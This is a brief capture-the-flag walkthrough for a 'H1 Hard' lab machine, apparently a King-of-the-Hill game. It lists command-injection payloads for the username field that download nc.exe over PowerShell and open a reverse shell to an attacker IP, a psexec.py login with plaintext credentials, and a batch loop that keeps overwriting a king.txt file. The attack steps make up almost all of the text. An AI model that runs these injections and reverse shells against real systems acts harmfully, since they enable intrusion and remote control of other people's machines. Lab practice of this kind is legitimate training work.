# H1 Hard
## Method 1
1. goto -> `http://$IP/signup` and sign up.
2. `profile -> change username`
3. Right Click -> Inspect -> Netwok -> Right Click to script.js and click to Block URL
4. `cd webserver; python -m http.server 8080`.
5. Paste `jin | powershell curl YOUR_IP:8000/nc.exe -o nc.exe` to change username
6. Paste `nc -nvlp 45789` on your terminal and execute
2. Paste `jin | nc.exe 10.8.85.10 45789 -e powershell` to change username
## Method 2
1. Paste `python3 psexec.py hard.thm/achilles:winniethepooh@hard.thm` to terminal

## Defence
```bash
@echo off
:x
attrib -a -s -r -i C:\king.txt&echo YourNickHere > C:\king.txt&attrib +a +s +r +i C:\king.txt
goto x
```
